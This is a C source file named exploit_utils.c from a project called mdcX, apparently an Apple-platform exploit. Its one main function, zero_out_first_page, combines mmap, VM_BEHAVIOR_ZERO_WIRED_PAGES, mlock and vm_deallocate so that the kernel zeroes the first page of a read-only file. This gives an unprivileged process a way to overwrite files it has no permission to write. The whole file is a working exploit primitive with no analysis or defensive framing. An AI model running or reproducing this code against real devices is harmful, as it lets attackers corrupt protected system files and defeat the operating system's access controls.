//
//  exploit_utils.c
//  mdcX
//
//  Created by 이지안 on 5/9/25.
//

#include "exploit_utils.h"
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>

#define KERNEL_PAGE_SIZE 16384

static void* map_file_page_ro_internal(const char* path, int* fd_out) {
    fprintf(stderr, "map_file_page_ro_internal: Attempting to open '%s'\n", path);
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        perror("map_file_page_ro_internal: open failed");
        if (fd_out) *fd_out = -1;
        return MAP_FAILED;
    }
    if (fd_out) *fd_out = fd;
    fprintf(stderr, "map_file_page_ro_internal: Opened '%s', fd: %d\n", path, fd);

    fprintf(stderr, "map_file_page_ro_internal: Attempting to mmap fd %d\n", fd);
    void* mapped_at = mmap(NULL, KERNEL_PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
    if (mapped_at == MAP_FAILED) {
        perror("map_file_page_ro_internal: mmap failed");
        if (!fd_out) close(fd);
        return MAP_FAILED;
    }
    fprintf(stderr, "map_file_page_ro_internal: Mapped fd %d successfully\n", fd);
    return mapped_at;
}

int zero_out_first_page(const char *filePath) {
    kern_return_t kr;
    int fd = -1;
    void* page_mapped_at;

    if (filePath == NULL || filePath[0] == '\0') {
        // fprintf(stderr, "zero_out_first_page: Error - filePath is NULL or empty.\n");
        return 6;
    }

    page_mapped_at = map_file_page_ro_internal(filePath, &fd);

    if (page_mapped_at == MAP_FAILED) {
        if (fd != -1) close(fd);
        
        return 2;
    }
    // printf("zero_out_first_page: Mapped file '%s' at 0x%016llx\n", filePath, (uint64_t)page_mapped_at);


    kr = vm_behavior_set(mach_task_self(),
                         (vm_address_t)page_mapped_at,
                         KERNEL_PAGE_SIZE,
                         VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) {
        // fprintf(stderr, "zero_out_first_page: vm_behavior_set failed for '%s': %s\n", filePath, mach_error_string(kr));
        munmap(page_mapped_at, KERNEL_PAGE_SIZE);
        close(fd);
        return 3;
    }
    // printf("zero_out_first_page: Set VM_BEHAVIOR_ZERO_WIRED_PAGES for '%s'\n", filePath);
 
    int mlock_err = mlock(page_mapped_at, KERNEL_PAGE_SIZE);
    if (mlock_err != 0) {
        // perror("zero_out_first_page: mlock failed");
        vm_behavior_set(mach_task_self(), (vm_address_t)page_mapped_at, KERNEL_PAGE_SIZE, VM_BEHAVIOR_DEFAULT);
        munmap(page_mapped_at, KERNEL_PAGE_SIZE);
        close(fd);
        return 4;
    }
    // printf("zero_out_first_page: mlock success for '%s'\n", filePath);

    kr = vm_deallocate(mach_task_self(),
                       (vm_address_t)page_mapped_at,
                       KERNEL_PAGE_SIZE);
    if (kr != KERN_SUCCESS) {
        // fprintf(stderr, "zero_out_first_page: vm_deallocate failed for '%s': %s\n", filePath, mach_error_string(kr));
        munlock(page_mapped_at, KERNEL_PAGE_SIZE);
        vm_behavior_set(mach_task_self(), (vm_address_t)page_mapped_at, KERNEL_PAGE_SIZE, VM_BEHAVIOR_DEFAULT);
        munmap(page_mapped_at, KERNEL_PAGE_SIZE);
        close(fd);
        return 5;
    }
    // printf("zero_out_first_page: Deallocated map entries for '%s'. File page should be zeroed.\n", filePath);
    close(fd);
    return 0;
}
